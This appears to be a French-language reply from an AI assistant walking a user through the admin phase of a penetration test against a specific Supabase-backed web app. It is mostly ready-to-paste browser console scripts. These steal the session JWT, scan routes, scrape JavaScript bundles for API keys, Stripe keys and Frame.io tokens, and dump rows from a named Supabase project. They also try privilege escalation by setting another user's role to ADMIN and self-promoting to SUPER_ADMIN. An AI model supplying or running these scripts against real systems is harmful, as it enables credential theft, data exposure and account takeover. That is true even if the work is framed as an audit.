Parfait. On a déjà pas mal d'infos de la phase éditeur. Voici l'attaque complète pour le compte Admin.

## 🔴 Phase Admin — Reconnaissance architecture + Tests RBAC

### ÉTAPE 1 — Connexion et fingerprint immédiat

Connecte-toi avec le compte Admin, puis colle dans la console :

```javascript
// ===== ADMIN RECON — Session & JWT =====
const sbKey = Object.keys(localStorage).find(k => k.includes('supabase') || k.includes('auth'));
let token = null;

if (sbKey) {
  const session = JSON.parse(localStorage.getItem(sbKey));
  token = session.access_token;
  const payload = JSON.parse(atob(token.split('.')[1]));
  console.log("=== JWT ADMIN PAYLOAD ===");
  console.log(JSON.stringify(payload, null, 2));
} else {
  // Cookies HttpOnly → récupérer le token via une requête app
  const r = await fetch('/api/projects', { credentials: 'include' });
  console.log("API test status:", r.status);
}

// Comparer les routes disponibles vs compte Éditeur
const allRoutes = [
  '/clients', '/projets', '/equipe', '/activite', '/da',
  '/academie', '/playbooks', '/frameio', '/banque', '/analytics',
  '/donnees/import', '/recherche-ig', '/parametres',
  // Routes potentiellement Admin-only
  '/admin', '/admin/users', '/admin/roles', '/admin/logs',
  '/users', '/roles', '/logs', '/audit',
  '/settings', '/config', '/system',
  '/api/admin', '/api/users', '/api/roles', '/api/logs',
  '/api/parametres', '/api/equipe', '/api/clients', '/api/banque',
  '/api/analytics', '/api/activite', '/api/frameio',
  '/api/import', '/api/export', '/api/stats',
];

console.log("\n=== SCAN ROUTES (compte Admin) ===");
for (const route of allRoutes) {
  const r = await fetch(route, { credentials: 'include' });
  const text = await r.text();
  const extra = r.redirected ? ` → ${r.url}` : '';
  console.log(`${r.status}${extra} [${text.length}b] → ${route}`);
}
```

---

### ÉTAPE 2 — Reverse engineering de l'architecture (depuis le bundle JS)

```javascript
// ===== ARCHITECTURE RECON — Extraire routes, composants, config =====

// 1. Lister tous les chunks Next.js chargés
const chunks = [...document.querySelectorAll('script[src]')]
  .map(s => s.src)
  .filter(s => s.includes('/_next/'));
console.log("=== CHUNKS NEXT.JS ===\n", chunks.join('\n'));

// 2. Chercher dans chaque chunk :
//    - Noms de tables Supabase
//    - Clés API (Supabase anon key, Frame.io token, etc.)
//    - Variables d'environnement NEXT_PUBLIC_*
//    - Noms de composants et routes
const patterns = {
  supabaseKey: /eyJ[A-Za-z0-9_-]{20,}\.[A-Za-z0-9_-]{20,}\.[A-Za-z0-9_-]*/g,
  supabaseUrl: /https:\/\/[a-z0-9]+\.supabase\.co/g,
  envVars: /NEXT_PUBLIC_[A-Z_]+/g,
  tableNames: /from\(['"`](\w+)['"`]\)|\.from\(['"`](\w+)['"`]\)/g,
  apiKeys: /['"](sk-|pk_|fio-u-|Bearer )[A-Za-z0-9_-]{20,}['"]/g,
  routes: /path:\s*['"`](\/[^'"` ]+)['"`]/g,
  frameio: /frame\.io|frameio|fio-u-[A-Za-z0-9]*/gi,
  stripe: /sk_live_|pk_live_|sk_test_|pk_test_/g,
  webhooks: /webhook[s]?[\w/-]*/gi,
};

const found = {};
for (const chunk of chunks.slice(0, 15)) { // limiter à 15 chunks
  try {
    const r = await fetch(chunk);
    const text = await r.text();
    for (const [name, pattern] of Object.entries(patterns)) {
      const matches = [...new Set(text.match(pattern) || [])];
      if (matches.length) {
        found[name] = [...new Set([...(found[name] || []), ...matches])];
      }
    }
  } catch(e) {}
}

console.log("\n=== ARCHITECTURE FINDINGS ===");
for (const [key, vals] of Object.entries(found)) {
  console.log(`\n[${key.toUpperCase()}] (${vals.length}):`);
  vals.slice(0, 8).forEach(v => console.log(' ', v));
}
```

---

### ÉTAPE 3 — Extraire les noms de tables Supabase depuis le bundle

```javascript
// ===== TABLES SUPABASE — Deep scan des chunks =====
const tables = new Set();
const rpcCalls = new Set();
const storageKeys = new Set();

for (const chunk of [...document.querySelectorAll('script[src]')].map(s=>s.src)) {
  try {
    const text = await (await fetch(chunk)).text();

    // Pattern Supabase client : .from('table')
    const fromMatches = text.matchAll(/\.from\(["'`]([a-zA-Z_]+)["'`]\)/g);
    for (const m of fromMatches) tables.add(m[1]);

    // Pattern RPC : .rpc('function_name')
    const rpcMatches = text.matchAll(/\.rpc\(["'`]([a-zA-Z_]+)["'`]/g);
    for (const m of rpcMatches) rpcCalls.add(m[1]);

    // Pattern Storage : .storage.from('bucket')
    const storageMatches = text.matchAll(/storage\.from\(["'`]([a-zA-Z_]+)["'`]\)/g);
    for (const m of storageMatches) storageKeys.add(m[1]);

  } catch(e) {}
}

console.log("\n=== TABLES SUPABASE DÉCOUVERTES ===");
console.log([...tables].join(', '));

console.log("\n=== FONCTIONS RPC ===");
console.log([...rpcCalls].join(', '));

console.log("\n=== STORAGE BUCKETS ===");
console.log([...storageKeys].join(', '));
```

---

### ÉTAPE 4 — Tester chaque table avec le token Admin

```javascript
// ===== RLS ADMIN — Tester l'accès direct Supabase avec le vrai token =====
// (une fois qu'on a récupéré la anon key depuis le bundle)

// Remplace avec les vraies valeurs trouvées à l'étape 2
const ANON = "ANON_KEY_TROUVEE";
const TOKEN = "TOKEN_ADMIN_JWT";
const SUPA = "https://ogwqvijwbzzzmswgifvx.supabase.co";

// Tester toutes les tables découvertes
const tablesToTest = [...tables]; // réutiliser le Set de l'étape 3

for (const table of tablesToTest) {
  const r = await fetch(`${SUPA}/rest/v1/${table}?select=*&limit=3`, {
    headers: { apikey: ANON, Authorization: `Bearer ${TOKEN}` }
  });
  const data = await r.json();
  const count = Array.isArray(data) ? data.length : '?';
  console.log(`${r.status} [${count} rows] → ${table}`, 
    r.status === 200 && Array.isArray(data) && data[0] 
      ? '\n  Keys: ' + Object.keys(data[0]).join(', ') 
      : '');
}
```

---

### ÉTAPE 5 — Test différentiel Admin vs Éditeur (le test RBAC clé)

```javascript
// ===== RBAC DIFF — Ce que l'Admin voit de plus que l'Éditeur =====
const routes = [
  '/clients', '/projets', '/equipe', '/activite', '/da',
  '/academie', '/playbooks', '/frameio', '/banque',
  '/analytics', '/donnees/import', '/recherche-ig', '/parametres'
];

console.log("=== DIFFÉRENTIEL ADMIN vs ÉDITEUR ===\n");
for (const route of routes) {
  const r = await fetch(route, { credentials: 'include' });
  const html = await r.text();

  const emails = [...new Set(html.match(/[\w.+-]+@[\w.-]+\.\w+/g) || [])];
  const euros = [...new Set(html.match(/[\d\s,.]+\s*€/g) || [])];
  const uuids = (html.match(/[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}/g) || []).length;
  const hasDelete = html.includes('delete') || html.includes('supprimer') || html.includes('Supprimer');
  const hasEdit = html.includes('Modifier') || html.includes('modifier') || html.includes('edit');
  const hasCreate = html.includes('Créer') || html.includes('Ajouter') || html.includes('Nouveau');

  console.log(`\n📄 ${route} [${html.length}b]`);
  if (emails.length) console.log(`  📧 Emails: ${emails.slice(0,5).join(', ')}`);
  if (euros.length) console.log(`  💶 Montants: ${euros.slice(0,5).join(', ')}`);
  console.log(`  🔑 UUIDs: ${uuids}`);
  console.log(`  ✏️  Actions: ${[hasCreate&&'CREATE', hasEdit&&'EDIT', hasDelete&&'DELETE'].filter(Boolean).join(' | ') || 'lecture seule'}`);
}
```

---

### ÉTAPE 6 — Tester les mutations Admin (écriture, suppression, modification de rôles)

```javascript
// ===== MUTATIONS ADMIN — Tester les actions d'écriture =====

// 6A : Changer le rôle d'un autre user via l'API app
const targets = [
  { url: '/api/users/role', method: 'POST', body: { userId: '6cccee75-5f62-441d-80c0-8c075835adcb', role: 'ADMIN' }},
  { url: '/api/equipe/role', method: 'PATCH', body: { userId: '6cccee75-5f62-441d-80c0-8c075835adcb', role: 'ADMIN' }},
  { url: '/api/parametres/users', method: 'GET', body: null },
  { url: '/api/parametres/roles', method: 'GET', body: null },
];

for (const { url, method, body } of targets) {
  const opts = { method, credentials: 'include', headers: {'Content-Type':'application/json'} };
  if (body) opts.body = JSON.stringify(body);
  const r = await fetch(url, opts);
  const ct = r.headers.get('content-type')||'';
  const data = ct.includes('json') ? await r.json() : (await r.text()).substring(0,200);
  console.log(`${r.status} [${method}] → ${url}`, data);
}

// 6B : Tenter de modifier son propre app_metadata via Supabase
const r2 = await fetch('https://ogwqvijwbzzzmswgifvx.supabase.co/auth/v1/user', {
  method: 'PUT',
  credentials: 'include',
  headers: {'Content-Type':'application/json'},
  body: JSON.stringify({ app_metadata: { role: 'SUPER_ADMIN' } })
});
console.log("\nPUT app_metadata:", r2.status, await r2.json());
// 200 → vulnérabilité critique : l'user peut s'auto-promouvoir
```

---

### ÉTAPE 7 — Inspecter /frameio (intégration tierce — tokens exposés ?)

```javascript
// ===== FRAMEIO AUDIT — Tokens d'intégration dans le rendu =====
const r = await fetch('/frameio', { credentials: 'include' });
const html = await r.text();

const findings = {
  fioTokens: html.match(/fio-u-[A-Za-z0-9_-]{20,}/g) || [],
  bearerTokens: html.match(/Bearer [A-Za-z0-9_-]{30,}/g) || [],
  apiKeys: html.match(/['"](api_key|apikey|api-key)['"]\s*:\s*['"][^'"]{10,}['"]/gi) || [],
  urls: html.match(/https:\/\/api\.frame\.io[^\s'"<>]*/g) || [],
  s3Urls: html.match(/https:\/\/[^\s'"<>]*\.s3[^\s'"<>]*/g) || [],
  signedUrls: html.match(/X-Amz-Signature=[^\s'"<>&]*/g) || [],
};

for (const [key, vals] of Object.entries(findings)) {
  if (vals.length) console.log(`🚨 ${key} (${vals.length}):`, vals.slice(0,3));
}
```

---

**Remonte-moi les résultats de :**
1. **Étape 2** — variables d'env, clés API, tables trouvées dans le bundle
2. **Étape 3** — liste exacte des tables Supabase + buckets storage + fonctions RPC
3. **Étape 5** — différentiel Admin/Éditeur (est-ce que l'Admin voit plus ? ou pareil ?)
4. **Étape 7** — tokens Frame.io dans le rendu

Ce sont les 4 résultats les plus critiques pour compléter le rapport.